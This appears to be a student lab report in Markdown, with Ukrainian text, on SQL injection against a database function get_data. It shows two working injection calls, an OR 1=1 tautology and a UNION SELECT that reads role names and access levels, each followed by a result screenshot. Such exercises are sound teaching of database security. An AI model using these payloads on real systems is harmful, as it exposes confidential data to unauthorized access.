
#### Створити виклики функції з SQL-ін'єкціями по порушенню конфіденційності даних, приклади яких представлені в теоретичних відомостях.

Створити знімки екранів з результатами виконання викликів функції та розмітити їх у файлі get_data_results.md у GitHub-репозиторії.


` SELECT * FROM get_data('1'' OR 1=1 -- '); `

<img width="443" alt="Снимок экрана 2022-12-23 в 18 13 26" src="https://user-images.githubusercontent.com/46464830/209365781-e762da74-7e6e-42fc-9341-03d141340726.png">


`SELECT * FROM get_data('1'' UNION SELECT CAST(NULL AS INTEGER), CAST(role_name AS VARCHAR), CAST(access_level AS INTEGER) FROM role_access_level -- ');
`

<img width="567" alt="Снимок экрана 2022-12-23 в 18 12 36" src="https://user-images.githubusercontent.com/46464830/209365695-16bbabe4-56b1-45ef-bfeb-b6fcb651648f.png">
